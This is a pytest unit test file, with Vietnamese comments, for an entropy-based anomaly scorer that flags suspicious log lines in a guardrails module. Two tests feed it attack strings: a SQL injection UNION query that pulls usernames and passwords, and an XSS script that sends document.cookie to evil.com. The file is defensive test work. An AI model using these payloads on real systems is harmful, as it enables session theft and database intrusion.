"""
Unit Test cho module EntropyScorer (src/guardrails/template_miner.py).

Kiểm tra khả năng tính Shannon Entropy và phân loại log bất thường.
"""
import pytest
from src.guardrails.template_miner import EntropyScorer


class TestEntropyScorer:
    """Bộ kiểm thử cho EntropyScorer."""

    def setup_method(self):
        self.scorer = EntropyScorer(threshold=4.5)

    def test_empty_string(self):
        """Chuỗi rỗng phải trả về entropy = 0."""
        assert self.scorer.calculate("") == 0.0

    def test_single_character(self):
        """Chuỗi 1 ký tự lặp lại phải có entropy = 0 (không có sự biến đổi)."""
        assert self.scorer.calculate("aaaa") == 0.0

    def test_uniform_distribution(self):
        """Chuỗi với phân bố đều phải có entropy cao."""
        # 4 ký tự xuất hiện đều nhau -> entropy = log2(4) = 2.0
        entropy = self.scorer.calculate("abcd")
        assert abs(entropy - 2.0) < 0.01

    def test_benign_log_low_entropy(self):
        """Log hợp lệ thông thường phải có entropy thấp hơn ngưỡng."""
        benign = "GET /index.html HTTP/1.1 200 OK"
        result = self.scorer.score(benign)
        # Log bình thường thường có entropy trong khoảng 3.5-4.5
        assert result["entropy"] > 0
        assert isinstance(result["is_high_entropy"], bool)

    def test_sqli_payload_high_entropy(self):
        """Payload SQLi phức tạp thường có entropy cao."""
        sqli = "SELECT * FROM users WHERE id=1 OR 1=1 UNION SELECT username,password FROM admin--"
        result = self.scorer.score(sqli)
        assert result["entropy"] > 4.0

    def test_xss_payload_detection(self):
        """Payload XSS phức tạp có nhiều ký tự đặc biệt tạo entropy cao."""
        xss = '<script>document.location="http://evil.com/?c="+document.cookie</script>'
        result = self.scorer.score(xss)
        assert result["entropy"] > 4.0

    def test_is_high_entropy_flag(self):
        """Kiểm tra flag is_high_entropy hoạt động đúng với ngưỡng."""
        # Chuỗi đơn giản -> False
        assert self.scorer.is_high_entropy("aaabbb") is False
        # Chuỗi phức tạp nhiều ký tự -> True
        complex_str = "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ0123456789!@#$%"
        assert self.scorer.is_high_entropy(complex_str) is True

    def test_score_returns_priority(self):
        """Hàm score phải trả về priority HIGH hoặc NORMAL."""
        result = self.scorer.score("simple text")
        assert result["priority"] in ["HIGH", "NORMAL"]

    def test_custom_threshold(self):
        """EntropyScorer với ngưỡng tùy chỉnh phải hoạt động đúng."""
        strict_scorer = EntropyScorer(threshold=2.0)
        # Chuỗi "abcd" có entropy = 2.0, ngưỡng 2.0 -> không high
        assert strict_scorer.is_high_entropy("abcd") is False
        # Chuỗi phong phú hơn -> high
        assert strict_scorer.is_high_entropy("abcdefghijklmnop") is True
